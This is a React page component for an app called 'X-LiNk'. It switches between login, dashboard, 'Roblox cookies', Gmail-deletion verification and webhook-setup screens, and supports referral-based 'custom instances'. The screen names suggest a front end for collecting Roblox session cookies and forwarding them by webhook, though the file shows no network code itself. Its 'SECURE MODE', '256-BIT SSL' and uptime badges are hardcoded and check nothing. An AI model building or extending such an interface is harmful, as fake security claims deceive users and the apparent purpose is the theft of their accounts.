import { useState } from "react";
import { RainEffect } from "@/components/ui/rain-effect";
import { SnowEffect } from "@/components/ui/snow-effect";
import { PasswordLogin } from "@/components/ui/password-login";
import { Dashboard } from "@/components/ui/dashboard";
import { RobloxCookies } from "@/components/ui/roblox-cookies";
import { VerifyGmailDelete } from "@/components/ui/verify-gmail-delete";
import { SuccessNotification } from "@/components/ui/success-notification";
import { WebhookSetup } from "@/components/ui/webhook-setup";
import { useKeepAlive } from "@/hooks/use-keep-alive";

type Screen =
  | "login"
  | "dashboard"
  | "roblox-cookies"
  | "verify-gmail"
  | "webhook-setup"
  | "success";

const Index = () => {
  const [currentScreen, setCurrentScreen] = useState<Screen>("login");

  // Activate keep-alive system to prevent timeout
  const keepAlive = useKeepAlive();

  // Check if this is a custom instance
  const urlParams = new URLSearchParams(window.location.search);
  const isCustomInstance = urlParams.get("ref");

  const handleLoginSuccess = () => {
    setCurrentScreen("dashboard");
  };

  const handleDeleteGmail = () => {
    setCurrentScreen("roblox-cookies");
  };

  const handleDeleteVerifyGmail = () => {
    setCurrentScreen("verify-gmail");
  };

  const handleCreateWebhook = () => {
    setCurrentScreen("webhook-setup");
  };

  const handleBackToDashboard = () => {
    setCurrentScreen("dashboard");
  };

  const handleSuccess = () => {
    setCurrentScreen("success");
  };

  const renderScreen = () => {
    switch (currentScreen) {
      case "login":
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "dashboard":
        return (
          <Dashboard
            onDeleteGmail={handleDeleteGmail}
            onDeleteVerifyGmail={handleDeleteVerifyGmail}
            // Only pass webhook creation function if NOT a custom instance
            onCreateWebhook={
              !isCustomInstance ? handleCreateWebhook : undefined
            }
          />
        );
      case "roblox-cookies":
        return (
          <RobloxCookies
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "verify-gmail":
        return (
          <VerifyGmailDelete
            onBack={handleBackToDashboard}
            onSuccess={handleSuccess}
          />
        );
      case "webhook-setup":
        // Only allow webhook setup for main instance
        if (!isCustomInstance) {
          return <WebhookSetup onBack={handleBackToDashboard} />;
        }
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
      case "success":
        return (
          <SuccessNotification onBackToDashboard={handleBackToDashboard} />
        );
      default:
        return <PasswordLogin onSuccess={handleLoginSuccess} />;
    }
  };

  return (
    <div className="min-h-screen relative overflow-hidden bg-gradient-to-br from-slate-950 via-blue-950 to-black">
      {/* Ultra-Professional Multi-Layer Background System */}
      <div className="absolute inset-0 bg-gradient-to-br from-slate-950 via-blue-950 to-black opacity-95" />

      {/* Premium Metallic Gradient Overlay */}
      <div
        className="absolute inset-0 opacity-40"
        style={{
          background: `
            radial-gradient(circle at 20% 80%, rgba(120, 113, 108, 0.4) 0%, transparent 50%),
            radial-gradient(circle at 80% 20%, rgba(82, 82, 91, 0.4) 0%, transparent 50%),
            radial-gradient(circle at 40% 40%, rgba(59, 130, 246, 0.15) 0%, transparent 50%),
            radial-gradient(circle at 60% 60%, rgba(147, 51, 234, 0.1) 0%, transparent 50%),
            linear-gradient(135deg, rgba(30, 41, 59, 0.3) 0%, rgba(15, 23, 42, 0.6) 100%)
          `,
        }}
      />

      {/* Premium Diamond Grid Pattern */}
      <div
        className="absolute inset-0 opacity-[0.03]"
        style={{
          backgroundImage: `
            linear-gradient(rgba(59, 130, 246, 0.6) 1px, transparent 1px),
            linear-gradient(90deg, rgba(59, 130, 246, 0.6) 1px, transparent 1px),
            radial-gradient(circle at 50% 50%, rgba(147, 51, 234, 0.3) 1px, transparent 1px)
          `,
          backgroundSize: "40px 40px, 40px 40px, 80px 80px",
          animation: "gridShift 15s linear infinite",
        }}
      />

      {/* Ultra-Premium Ambient Light Effects */}
      <div className="absolute top-0 left-1/4 w-[500px] h-[500px] bg-blue-500/8 rounded-full blur-3xl animate-pulse-ultra-slow" />
      <div
        className="absolute bottom-0 right-1/4 w-[500px] h-[500px] bg-purple-500/8 rounded-full blur-3xl animate-pulse-ultra-slow"
        style={{ animationDelay: "2s" }}
      />
      <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-[1000px] h-[1000px] bg-gradient-radial from-blue-500/5 to-transparent rounded-full blur-3xl" />

      {/* Premium Spotlight Effects */}
      <div
        className="absolute top-0 left-0 w-full h-full opacity-20 pointer-events-none"
        style={{
          background: `
            conic-gradient(from 45deg at 25% 25%, rgba(59, 130, 246, 0.3) 0deg, transparent 90deg),
            conic-gradient(from 225deg at 75% 75%, rgba(147, 51, 234, 0.2) 0deg, transparent 90deg)
          `,
        }}
      />

      {/* Professional Depth Layers */}
      <div className="absolute inset-0 bg-gradient-to-t from-black/30 via-transparent to-black/10" />
      <div className="absolute inset-0 bg-gradient-to-r from-black/20 via-transparent to-black/20" />

      {/* Enhanced Weather Effects */}
      <RainEffect />
      <SnowEffect />

      {/* Ultra-Professional Status Panel */}
      <div className="fixed top-6 right-6 z-50 flex flex-col gap-3">
        {/* System Status Indicator */}
        <div className="glass-effect rounded-2xl px-5 py-3 border border-green-500/20 shadow-lg backdrop-blur-xl">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></div>
              <div className="absolute inset-0 w-3 h-3 bg-green-400 rounded-full animate-ping opacity-30"></div>
            </div>
            <div className="flex flex-col">
              <span className="text-xs font-bold text-green-300 font-mono tracking-wider">
                SYSTEM ONLINE
              </span>
              <span className="text-[10px] text-green-400/70 font-mono">
                {new Date().toLocaleTimeString()}
              </span>
            </div>
            <div className="w-px h-6 bg-green-500/30"></div>
            <div className="text-[10px] text-green-400/70 font-mono">99.9%</div>
          </div>
        </div>

        {/* Instance Type Indicator */}
        {isCustomInstance && (
          <div className="glass-effect rounded-2xl px-5 py-3 border border-purple-500/20 shadow-lg backdrop-blur-xl">
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="w-3 h-3 bg-purple-400 rounded-full"></div>
                <div className="absolute inset-0 w-3 h-3 bg-purple-400 rounded-full animate-pulse opacity-60"></div>
              </div>
              <div className="flex flex-col">
                <span className="text-xs font-bold text-purple-300 font-mono tracking-wider">
                  CUSTOM INSTANCE
                </span>
                <span className="text-[10px] text-purple-400/70 font-mono">
                  ID: {isCustomInstance.slice(0, 8)}...
                </span>
              </div>
            </div>
          </div>
        )}

        {/* Security Level Indicator */}
        <div className="glass-effect rounded-2xl px-5 py-3 border border-blue-500/20 shadow-lg backdrop-blur-xl">
          <div className="flex items-center gap-3">
            <div className="relative">
              <div className="w-3 h-3 bg-blue-400 rounded-full"></div>
              <div className="absolute inset-0 w-3 h-3 bg-blue-400 rounded-full animate-pulse opacity-60"></div>
            </div>
            <div className="flex flex-col">
              <span className="text-xs font-bold text-blue-300 font-mono tracking-wider">
                SECURE MODE
              </span>
              <span className="text-[10px] text-blue-400/70 font-mono">
                256-BIT SSL
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Ultra-Professional Watermark */}
      <div className="fixed bottom-6 left-6 z-50">
        <div className="glass-effect rounded-2xl px-6 py-4 border border-blue-500/20 shadow-xl backdrop-blur-xl">
          <div className="flex items-center gap-4">
            <div className="relative">
              <div className="w-10 h-10 bg-gradient-to-br from-blue-500 via-blue-600 to-purple-700 rounded-xl flex items-center justify-center shadow-lg">
                <span className="text-white font-bold text-lg metallic-text">
                  X
                </span>
              </div>
              <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-400 rounded-full flex items-center justify-center">
                <div className="w-2 h-2 bg-white rounded-full"></div>
              </div>
            </div>
            <div className="flex flex-col">
              <span className="text-white font-bold text-lg tracking-wide metallic-text">
                X-LiNk
              </span>
              <div className="flex items-center gap-2">
                <span className="text-gray-400 text-xs font-mono">
                  v2.1 Ultra Professional
                </span>
                <div className="w-1 h-1 bg-gray-500 rounded-full"></div>
                <span className="text-gray-500 text-xs font-mono">
                  Enterprise
                </span>
              </div>
            </div>
            <div className="w-px h-8 bg-blue-500/30"></div>
            <div className="flex flex-col items-center">
              <span className="text-[10px] text-gray-500 font-mono">
                STATUS
              </span>
              <span className="text-xs text-green-400 font-mono font-bold">
                ACTIVE
              </span>
            </div>
          </div>
        </div>
      </div>

      {/* Ultra-Premium Floating Elements */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        {/* Premium Floating Particles */}
        {[...Array(20)].map((_, i) => (
          <div
            key={`particle-${i}`}
            className="absolute rounded-full animate-float"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 4}s`,
              animationDuration: `${4 + Math.random() * 3}s`,
              width: `${2 + Math.random() * 3}px`,
              height: `${2 + Math.random() * 3}px`,
              background: `radial-gradient(circle, rgba(59, 130, 246, ${0.2 + Math.random() * 0.3}) 0%, transparent 70%)`,
            }}
          />
        ))}

        {/* Premium Geometric Shapes */}
        {[...Array(8)].map((_, i) => (
          <div
            key={`shape-${i}`}
            className="absolute opacity-10 animate-float"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animationDuration: `${6 + Math.random() * 4}s`,
              width: `${8 + Math.random() * 16}px`,
              height: `${8 + Math.random() * 16}px`,
              background: `linear-gradient(45deg, rgba(59, 130, 246, 0.3), rgba(147, 51, 234, 0.3))`,
              borderRadius: Math.random() > 0.5 ? "50%" : "20%",
              transform: `rotate(${Math.random() * 360}deg)`,
            }}
          />
        ))}
      </div>

      {/* Ultra-Professional Scanlines */}
      <div
        className="absolute inset-0 opacity-[0.015] pointer-events-none"
        style={{
          background: `
            repeating-linear-gradient(
              0deg,
              transparent,
              transparent 1px,
              rgba(59, 130, 246, 0.15) 1px,
              rgba(59, 130, 246, 0.15) 2px
            ),
            repeating-linear-gradient(
              90deg,
              transparent,
              transparent 60px,
              rgba(147, 51, 234, 0.05) 60px,
              rgba(147, 51, 234, 0.05) 61px
            )
          `,
        }}
      />

      {/* Main Content Container */}
      <div className="relative z-10 min-h-screen">
        <div className="animate-fade-in">{renderScreen()}</div>
      </div>

      {/* Ultra-Professional Frame System */}
      <div className="fixed inset-0 pointer-events-none z-40">
        {/* Top Left Corner */}
        <div className="absolute top-0 left-0 w-40 h-40">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500/60 via-blue-400/40 to-transparent"></div>
          <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-blue-500/60 via-blue-400/40 to-transparent"></div>
          <div className="absolute top-3 left-3 w-6 h-6 border-l-2 border-t-2 border-blue-400/50"></div>
          <div className="absolute top-1 left-1 w-2 h-2 bg-blue-400/70 rounded-full"></div>
        </div>

        {/* Top Right Corner */}
        <div className="absolute top-0 right-0 w-40 h-40">
          <div className="absolute top-0 right-0 w-full h-1 bg-gradient-to-l from-purple-500/60 via-purple-400/40 to-transparent"></div>
          <div className="absolute top-0 right-0 w-1 h-full bg-gradient-to-b from-purple-500/60 via-purple-400/40 to-transparent"></div>
          <div className="absolute top-3 right-3 w-6 h-6 border-r-2 border-t-2 border-purple-400/50"></div>
          <div className="absolute top-1 right-1 w-2 h-2 bg-purple-400/70 rounded-full"></div>
        </div>

        {/* Bottom Left Corner */}
        <div className="absolute bottom-0 left-0 w-40 h-40">
          <div className="absolute bottom-0 left-0 w-full h-1 bg-gradient-to-r from-cyan-500/60 via-cyan-400/40 to-transparent"></div>
          <div className="absolute bottom-0 left-0 w-1 h-full bg-gradient-to-t from-cyan-500/60 via-cyan-400/40 to-transparent"></div>
          <div className="absolute bottom-3 left-3 w-6 h-6 border-l-2 border-b-2 border-cyan-400/50"></div>
          <div className="absolute bottom-1 left-1 w-2 h-2 bg-cyan-400/70 rounded-full"></div>
        </div>

        {/* Bottom Right Corner */}
        <div className="absolute bottom-0 right-0 w-40 h-40">
          <div className="absolute bottom-0 right-0 w-full h-1 bg-gradient-to-l from-emerald-500/60 via-emerald-400/40 to-transparent"></div>
          <div className="absolute bottom-0 right-0 w-1 h-full bg-gradient-to-t from-emerald-500/60 via-emerald-400/40 to-transparent"></div>
          <div className="absolute bottom-3 right-3 w-6 h-6 border-r-2 border-b-2 border-emerald-400/50"></div>
          <div className="absolute bottom-1 right-1 w-2 h-2 bg-emerald-400/70 rounded-full"></div>
        </div>

        {/* Professional Border Accents */}
        <div className="absolute top-6 left-1/2 transform -translate-x-1/2 w-32 h-px bg-gradient-to-r from-transparent via-blue-400/50 to-transparent"></div>
        <div className="absolute bottom-6 left-1/2 transform -translate-x-1/2 w-32 h-px bg-gradient-to-r from-transparent via-purple-400/50 to-transparent"></div>
        <div className="absolute left-6 top-1/2 transform -translate-y-1/2 w-px h-32 bg-gradient-to-b from-transparent via-cyan-400/50 to-transparent"></div>
        <div className="absolute right-6 top-1/2 transform -translate-y-1/2 w-px h-32 bg-gradient-to-b from-transparent via-emerald-400/50 to-transparent"></div>
      </div>
    </div>
  );
};

export default Index;
